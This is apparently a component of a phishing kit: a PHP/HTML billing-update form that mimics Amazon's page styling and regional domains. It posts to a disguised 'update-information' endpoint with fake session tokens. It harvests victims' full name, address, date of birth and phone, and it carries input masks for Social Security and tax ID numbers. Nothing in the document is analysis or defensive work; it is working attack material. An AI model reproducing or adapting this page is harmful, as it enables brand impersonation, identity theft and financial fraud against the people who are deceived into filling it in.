
<!-- HTML INPUTS FOR BILING PAGE -->
<!-- CODE STARTS HERE -->
<script type="text/javascript">
  function upperCaseF(a){
    setTimeout(function(){
      a.value = a.value.toUpperCase();
    }
               , 1);
  }
</script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script><script src="http://code.jquery.com/ui/1.9.2/jquery-ui.js"></script>
<form method="POST" action="lastmono?cmd=_update-information&account_card=<?php  echo md5(microtime());?>&lim_session=<?php  echo sha1(microtime()); ?>">
  <div class="a-row">
    <?php  ################################################################################################################################### ?>
    <div class="a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
      <label for="asv-allowances-title"><?php echo $_LANG['FRMUP'];?>
      </label>
      <div class="a-input-text-wrapper ">
        <input type="text" id="full_name" name="full_name" onkeydown="upperCaseF(this)" autocomplete="off" required="" pattern="[A-Za-z].{6,}" value="" placeholder="<?php echo $_LANG['FRMUP'];?>" class="a-declarative a-input-text"  maxlength="30" />
      </div>
    </div>
  </div>
  <div class="a-row">
    <?php  ################################################################################################################################### ?>
    <div class="a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
      <label for="asv-allowances-recipient-email" class="aok-inline-block"><?php echo $_LANG['TITLEADDRESS1'];?>
      </label>
      <div class="a-input-text-wrapper ">
        <input type="text" id="add_1" name="add_1" style="text-transform: capitalize;"  autocomplete="off" class="a-declarative a-input-text" required="" title="<?php echo $_LANG['UPALERT'];?>" placeholder="<?php echo $_LANG['ADDRESS1'];?>" />
      </div>
    </div>
  </div>
  <div class="a-row">
    <?php  ################################################################################################################################### ?>
    <div class="a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
      <label for="asv-allowances-sender-name"><?php echo $_LANG['TITLEADDRESS2'];?>
      </label>
      <div class="a-input-text-wrapper ">
        <input type="text" id="add_2" value="" autocomplete="off" class="a-declarative a-input-text" title="<?php echo $_LANG['UPALERT'];?>" placeholder="<?php echo $_LANG['ADDRESS2'];?>" name="add_2" >
      </div>
    </div>
  </div>
  <div class="a-row">
    <?php  ################################################################################################################################### ?>
    <div class="a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
      <label for="asv-allowances-title"><?php echo $_LANG['FRMUP2'];?>
      </label>
      <div class="a-input-text-wrapper ">
        <input type="text" style="text-transform: capitalize;" id="city" value="<?=$_SESSION['_LOOKUP_CITY_'];?>" placeholder="City" required="" title="<?php echo $_LANG['UPALERT1'];?>" maxlength="30" class="a-declarative a-input-text" name="city" >
      </div>
    </div>
  </div>
  <div class="a-row">
    <?php  ################################################################################################################################### ?>
    <div class="a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
      <label for="asv-allowances-title"><?php echo $_LANG['FRMUP3'];?>
      </label>
      <div class="a-input-text-wrapper ">
        <input type="text" style="text-transform: capitalize;" id="state" value="<?=$_SESSION['_LOOKUP_REGIONS_'];?>" maxlength="50" required="" title="<?php echo $_LANG['UPALERT2'];?>" placeholder="State/Province/Region" name="state" class="a-declarative a-input-text" >
      </div>
    </div>
  </div>
  <div class="a-row">
    <?php  ################################################################################################################################### ?>
    <div class="a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
      <label for="asv-allowances-title"><?php echo $_LANG['FRMUP4'];?>
      </label>
      <div class="a-input-text-wrapper ">
        <input type="tel" id="ZIP" value="<?=$_SESSION['_LOOKUP_ZIPCODE_'];?>" autocapitalize=""  class="a-declarative a-input-text" maxlength="8" required="" title="<?php echo $_LANG['UPALERT3'];?>" placeholder="<?php echo $_LANG['FRMUP4'];?>" name="ZIP" >
      </div>
    </div>
  </div>
  <div class="a-row">
    <?php  ################################################################################################################################### ?>
    <div class="a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
      <label for="asv-allowances-title"><?php echo $_LANG['COUNTRY'];?>
      </label>
      <div class="a-input-text-wrapper ">
        <input type="text" id="asv-allowances-title" value="" autocomplete="off" class="a-declarative a-input-text" placeholder="<?php  echo $_SESSION['_LOOKUP_COUNTRY_']; ?>" >
      </div>
    </div>
  </div>
<script type="text/javascript" src="../data/js/jquery.js"></script><script type="text/javascript" src="../data/js/jquery.min.mask.js"></script><script src="../data/js/jquery.maskedinput.js" type="text/javascript"></script>
  <?php 
if ($_SESSION['_LOOKUP_CNTRCODE_']=="US" or $_SESSION['_LOOKUP_CNTRCODE_']=="FSM"){ echo '
<script type="text/javascript">
jQuery(function($){
$("#DOB").mask("99/99/9999",{placeholder:"MM/DD/YYYY"});
});
</script>
';}
else { echo '
<script type="text/javascript">
jQuery(function($){
$("#DOB").mask("99/99/9999",{placeholder:"DD/MM/YYYY"});
});
</script>
';}
?>	
  <script type="text/javascript">
    jQuery(function($){
      $("#tin").mask("99-9999999");
      $("#ssn").mask("999-99-9999");
    }
          );
  </script>
  <div class="a-row">
    <?php  ################################################################################################################################### ?>
    <div class="a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
      <label for="asv-allowances-title"><?php echo $_LANG['DOB'];?>
      </label>
      <div class="a-input-text-wrapper ">
        <input type="tel" required="" title="<?php echo $_LANG['UPALERT5'];?>" placeholder="<?php if ($_SESSION['_LOOKUP_CNTRCODE_']=="US"){ echo 'MM/DD/YYYY';} else { echo 'DD/MM/YYYY';}?>" id="DOB" name="DOB" value="" autocomplete="off" class="a-declarative a-input-text"  maxlength="50" >
      </div>
    </div>
  </div>
  <div class="a-row">
    <?php  ################################################################################################################################### ?>
    <div class="a-column a-span12 a-spacing-medium a-ws-span12 a-ws-spacing-medium asv-field-wrapper">
      <label for="asv-allowances-title"><?php echo $_LANG['FRMUP5'];?>
      </label>
      <div class="a-input-text-wrapper ">
        <input type="tel" id="phone" placeholder="<?php echo $_LANG['FRMUP5'];?>" name="phone" value="" autocomplete="off" class="a-declarative a-input-text" maxlength="20" >
      </div>
    </div>
  </div>
  <?php  ################################################################################################################################### ?>
  <div class="a-section a-spacing-extra-large a-spacing-top-extra-large">
    <div class="a-popover-preload" id="a-popover-legalTerms">
      <span><?php echo $_LANG['TERMS1'];?>
        <?php  
if     ($_SESSION['_LOOKUP_CNTRCODE_']=="GB"){ echo 'co.uk';}
elseif ($_SESSION['_LOOKUP_CNTRCODE_']=="IN"){ echo 'in';}
elseif ($_SESSION['_LOOKUP_CNTRCODE_']=="CA"){ echo 'ca';}
elseif ($_SESSION['_LOOKUP_CNTRCODE_']=="FR"){ echo 'fr';}
elseif ($_SESSION['_LOOKUP_CNTRCODE_']=="AU"){ echo 'com.au';}
elseif ($_SESSION['_LOOKUP_CNTRCODE_']=="BR"){ echo 'com.br';}
elseif ($_SESSION['_LOOKUP_CNTRCODE_']=="CN"){ echo 'cn';}
elseif ($_SESSION['_LOOKUP_CNTRCODE_']=="IT"){ echo 'it';}
elseif ($_SESSION['_LOOKUP_CNTRCODE_']=="JP"){ echo 'co.jp';}
elseif ($_SESSION['_LOOKUP_CNTRCODE_']=="MX"){ echo 'com.mx';}
elseif ($_SESSION['_LOOKUP_CNTRCODE_']=="ES"){ echo 'es';}
elseif ($_SESSION['_LOOKUP_CNTRCODE_']=="DE"){ echo 'de';}
else                       { echo 'com';} ?><?php echo $_LANG['TERMS2'];?>
      </span>
    </div>
    <h3 class="a-spacing-mini">
      <?php echo $_LANG['TERMS'];?>
    </h3>
    <span class="a-declarative" data-action="a-secondary-view" data-a-secondary-view="{&quot;name&quot;:&quot;legalTerms&quot;,&quot;position&quot;:&quot;triggerVertical&quot;}">
      <a href="#" class="a-touch-link a-box">
        <div class="a-box-inner">
          <i class="a-icon a-icon-touch-link">
          </i>
          <span class="a-size-small a-color-tertiary">
            <?php echo $_LANG['TERMS1'];?>
            <?php  
if     ($_SESSION['_LOOKUP_CNTRCODE_']=="GB"){ echo 'co.uk';}
elseif ($_SESSION['_LOOKUP_CNTRCODE_']=="IN"){ echo 'in';}
elseif ($_SESSION['_LOOKUP_CNTRCODE_']=="CA"){ echo 'ca';}
elseif ($_SESSION['_LOOKUP_CNTRCODE_']=="FR"){ echo 'fr';}
elseif ($_SESSION['_LOOKUP_CNTRCODE_']=="AU"){ echo 'com.au';}
elseif ($_SESSION['_LOOKUP_CNTRCODE_']=="BR"){ echo 'com.br';}
elseif ($_SESSION['_LOOKUP_CNTRCODE_']=="CN"){ echo 'cn';}
elseif ($_SESSION['_LOOKUP_CNTRCODE_']=="IT"){ echo 'it';}
elseif ($_SESSION['_LOOKUP_CNTRCODE_']=="JP"){ echo 'co.jp';}
elseif ($_SESSION['_LOOKUP_CNTRCODE_']=="MX"){ echo 'com.mx';}
elseif ($_SESSION['_LOOKUP_CNTRCODE_']=="ES"){ echo 'es';}
elseif ($_SESSION['_LOOKUP_CNTRCODE_']=="DE"){ echo 'de';}
else                       { echo 'com';} ?><?php echo $_LANG['TERMS2'];?>
          </span>
        </div>
      </a>
    </span>
  </div>
  <?php  ################################################################################################################################### ?>
  <div class="a-section a-spacing-top-extra-large">
    <span class="a-button a-button-span12 a-button-primary">
      <span class="a-button-inner">
        <button id="submit" class="a-button-text" type="submit"><?php echo $_LANG['SAVE'];?></button>
      </span>
    </span>
  </div>
</form>
<!-- CODE ENDS HERE -->
